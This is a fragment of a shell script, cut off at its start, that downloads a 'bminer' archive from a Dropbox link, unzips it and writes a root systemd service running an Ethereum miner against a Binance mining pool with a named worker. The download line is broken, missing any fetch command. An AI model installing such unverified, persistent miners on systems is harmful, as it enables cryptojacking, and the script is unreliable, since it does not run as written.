...
then
	...
	sudo https://www.dropbox.com/s/cjg0ok2gweqkeya/bminer.zip?dl=1
	sudo unzip bminer.zip
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bminer -uri ethproxy://bravotd.bravotd02.@ethash.poolbinance.com:1800" > /etc/systemd/system/eth.service'	
